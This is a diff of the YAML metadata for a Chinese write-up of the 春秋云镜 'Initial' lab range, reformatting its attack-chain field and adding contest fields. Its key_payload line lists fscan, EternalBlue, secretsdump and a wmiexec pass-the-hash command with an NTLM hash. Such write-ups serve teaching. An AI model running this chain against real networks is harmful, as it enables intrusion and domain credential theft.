@@ -11,7 +11,14 @@ tags:
 - MS17-010
 - DCSync
 - 信呼OA
-attack_chain: fscan扫描→ThinkPHP5023 RCE→sudo mysql -e读flag1→frp代理进内网→MS17-010打XIAORANG-WIN7→secretsdump导出域管hash→wmiexec登录DC01读flag
+attack_chain:
+- 'fscan扫描'
+- 'ThinkPHP5023 RCE'
+- 'sudo mysql -e读flag1'
+- 'frp代理进内网'
+- 'MS17-010打XIAORANG-WIN7'
+- 'secretsdump导出域管hash'
+- 'wmiexec登录DC01读flag'
 key_payload: fscan -h 172.22.2.1/24;ms17_010_eternalblue;secretsdump.py XIAORANG-WIN7$@172.22.1.2;wmiexec.py xiaorang/administrator@172.22.1.2 -hashes :10cf89a850fb1cdbe6bb432b859164c8
 one_liner: 春秋云镜Initial：ThinkPHP5+MS17-010+secretsdump/wmiexec横向三件套
 lesson: 入门靶场：web RCE→frp代理→MSF永恒之蓝→impacket工具链横向
@@ -56,6 +63,8 @@ prerequisites:
 - frp 代理
 - MS17-010
 - impacket 工具链（secretsdump/wmiexec）
+contest_normalized: "春秋云镜靶场"
+contest_year: 2023
 ---
 # 春秋云镜-Initial-WriteUp
 
